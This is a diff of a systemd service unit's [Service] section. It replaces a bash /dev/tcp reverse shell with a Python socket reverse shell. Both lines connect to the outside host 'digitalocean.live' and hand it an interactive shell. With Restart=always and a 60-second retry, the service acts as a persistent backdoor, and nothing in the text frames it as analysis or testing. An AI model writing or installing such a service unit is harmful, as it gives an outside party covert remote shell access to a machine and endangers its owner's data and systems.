@@ -15,7 +15,7 @@ After=network-online.target
 Wants=network-online.target
 
 [Service]
-ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/digitalocean.live/$PORT 0>&1'
+ExecStart=/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("digitalocean.live",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
 Restart=always
 RestartSec=60
 StandardOutput=journal
